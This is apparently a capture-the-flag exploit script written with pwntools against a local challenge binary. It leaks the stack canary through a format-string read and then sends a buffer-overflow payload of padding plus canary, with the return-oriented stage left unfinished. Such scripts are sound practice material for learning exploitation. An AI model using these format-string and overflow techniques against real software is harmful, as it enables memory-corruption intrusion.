#!/usr/bin/env python3 
from pwn import *

context.update(arch='amd64', os='linux')
context.log_level = "debug"

chall = "./chal2"
p = process(chall)

emoji1 = b"\xf0\x9f\xa7\x91"  # ğŸ§‘
emoji2 = b"\xf0\x9f\x90\xa6"  # ğŸ¦


# canary leak
p.sendlineafter(emoji1 + b" > ", b"%15$p")
p.recvuntil(emoji2 + b" > ")
canary = int(p.recvuntil(emoji1, drop=True).strip(), 16)
log.info("canary: " + hex(canary))


# rop?
payload = b"A"*72 + p64(canary)
p.sendlineafter(b"> ", payload)

p.interactive()
